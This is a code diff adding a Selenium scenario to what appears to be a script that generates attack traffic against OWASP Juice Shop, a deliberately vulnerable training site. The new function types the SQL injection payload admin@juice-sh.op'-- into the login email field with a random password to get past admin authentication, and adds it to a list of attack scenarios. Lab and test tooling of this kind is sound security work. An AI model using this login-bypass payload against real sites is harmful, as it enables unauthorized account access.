@@ -768,6 +768,33 @@ def scenario_sql_login_attack(driver, verbose=config.config['verbose']):
 
     return
 
+def scenario_admin_login_without_passwd_attack(driver, verbose=config.config['verbose']):
+    global is_logged_in
+    global current_logged_in
+    global accounts
+
+    if verbose:
+        print ("ENTER ERROR MESSAGE ATTACK")
+    
+    # 1. Check if is log in
+    if is_logged_in:
+        scenario_logout(driver=driver, verbose=verbose)
+
+    # 2. Attack under specific pattern
+    # 2-1. generate SQL pattern
+    
+    attackPasswordLength = random.randint(1, 15)
+    randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))
+    
+    # 2-2. attack in logging in 
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
+    random_sleep(1, 2)
+    driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys("admin@juice-sh.op'--")
+    driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
+    driver.find_element_by_xpath('//*[@id="loginButton"]').click()
+    is_logged_in = True
+
+    return
 #***********************************
 #add all your scenario function here
 #***********************************
@@ -790,5 +817,6 @@ scenario_list = [
 attack_scenario_list = [
     scenario_xss_searchbar_attack,
     scenario_xss_trackorders_attack,
-    scenario_sql_login_attack
+    scenario_sql_login_attack,
+    scenario_admin_login_without_passwd_attack,
 ]
